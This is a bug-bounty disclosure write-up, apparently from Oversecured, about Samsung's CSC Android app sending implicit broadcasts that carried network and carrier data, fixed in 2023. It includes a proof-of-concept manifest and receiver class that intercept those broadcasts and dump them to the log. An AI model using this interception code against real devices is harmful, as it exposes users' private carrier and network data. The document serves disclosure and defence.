# Details

<table>
    <tr>
        <td>Name</td>
        <td>CSC</td>
    </tr>
    <tr>
        <td>Package name</td>
        <td><code>com.samsung.sec.android.application.csc</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.09.20</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2023.02.07</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Low</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td>N/A</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$450</td>
    </tr>
</table>

# Description

Oversecured report:
![](Oversecured_report.png)

Oversecured found the CSC app using implicit intents when sending broadcasts. They contained sensitive data like network and carrier data. These intents could have been intercepted by third-party apps installed on the same device.

**Proof of Concept**

File `AndroidManifest.xml`:
```xml
<receiver android:name=".MyReceiver" android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.CHAMELEON_TELEPHONY_UPDATE" />
        <action android:name="com.samsung.CSC_CHAMELEON_UPDATE_SETTINGS" />
        <action android:name="com.sec.factory.aporiented.athandler.atpreconfg" />
    </intent-filter>
    <intent-filter>
        <action android:name="com.samsung.sec.android.application.csc.chameleon_diag" />
        <data android:scheme="android_secret_code" android:host="diag_msl" />
    </intent-filter>
</receiver>
```

File `MyReceiver.java`:
```java
public class MyReceiver extends BroadcastReceiver {
    public void onReceive(Context context, Intent intent) {
        DumpUtils.dump(intent, context.getClassLoader());
    }
}
```

The implementation of the `DumpUtils.dump()` method can be found in the source code. We use the functionality of the Gson library to turn objects of any class into a string and then dump it to the log.

## References

- [Oversecured Blog. Interception of Android implicit intents](https://blog.oversecured.com/Interception-of-Android-implicit-intents/)
